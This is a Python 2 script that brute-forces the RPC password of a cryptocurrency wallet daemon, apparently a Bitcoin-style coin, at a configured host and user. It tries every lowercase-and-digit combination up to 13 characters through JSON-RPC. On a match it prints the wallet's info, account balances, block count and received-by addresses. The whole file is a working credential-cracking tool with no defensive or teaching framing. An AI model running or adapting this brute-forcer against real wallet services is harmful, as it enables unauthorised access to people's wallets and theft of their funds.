from jsonrpc import ServiceProxy
import sys
import string
from datetime import datetime

ALLCHAR = range(32,127)
SYMB = [32,33,36,42,43]
NUM = range(48, 58) 
UPPRR = range(65, 91)
# LOWRR = range(97, 123)
OOLOWRR = range(98, 123)
# easyRange = [32,33,36,42,43] + range(48, 58) + range(65, 91) + range(97, 123)
ilastTme = 0.0
istartTme = 0
found = 0
maxChars = 13
charset = OOLOWRR + NUM
rpcuser = "co1nzd"
target = "127.0.0.1:8338"
c = 0


def test( p ):
    global target
    global rpcuser
    global found
    a = ":"
    # print str(p)
    retz = []
    i = 0
    try:
        access = ServiceProxy("http://"+rpcuser+":"+p+"@"+target, timeout=10)
        a = "-"
        retz.append( str( access.getinfo() ) )
        i = i + 1
        a = "x"
        found = 1
        retz.append( str( access.listaccounts() ) )
        
        i = i + 1
        a = "#"
        retz.append(  str( access.getblockcount() ) )
        i = i + 1
        a = "@"
        retz.append( str( access.listreceivedbyaddress(0,True) ) )
        i = i + 1
        a = "."
        print 
        print "--"
        print "-   /!\\"
        print ""
        print "-  match [" + p + "] with "+str(i)+" success"
        
        i = 0
        # print "listaccounts["+str(len(retz[0]))+"] :"
        print "listaccounts["+str(len(retz[i]))+"] :"
        print str(retz[i])
        print "-"
        
        i = i + 1
        print "getinfo["+str(len(retz[i]))+"] :"
        print str(retz[i])
        print "-"
        
        i = i + 1
        print "getblockcount["+str(len(retz[i]))+"] :"
        print str(retz[i])
        print "-"
        
        i = i + 1
        print "listreceivedbyaddress["+str(len(retz[i]))+"] :"
        print str(retz[i])
        naw =  datetime.now( ) 
        print 
        print "\t------"
        print 
        print "------------------------------"
        # print "------"
        print 
        print str( naw ) +" - "+ str( istartTme )  +" = "+ str( naw - istartTme )
        
        a = "_"
        sys.exit()
    except Exception as e:
        sys.stdout.write( a )
        if i > 0:
            sys.stdout.write( "!" )
            sys.stdout.write( str( i ) )
            sys.stdout.write( "!" )
        # sys.stdout.write( str( p ) )
        # sys.stdout.write( a )
        # print( str(e) )
def b_for(width, pos, baseString):
    
    global found
    p = ""
    cc = ""
    print "recurse [W : "+str(width)+" - Pos : "+str(pos)+" - Test : "+str(baseString)+".*]"
    
    for char in charset:
    
        p = baseString + "%c" % char
        if ( pos < width - 1 ):
            b_for(width, pos + 1, p)
            
        # cc = "http://"+rpcuser+":"+p+"@"+target
        # sys.stdout.write( p )
        test(p)
        if found:
            return

print "Target max [" + str( maxChars ) + "] one [" + str( target ) + "x]"
ilastTme = 0.0
istartTme = datetime.now( ) 
for baseWidth in range(1, maxChars + 1):
    # print "checking passwords width [" + `baseWidth` + "]"
    b_for(baseWidth, 0, "")
    
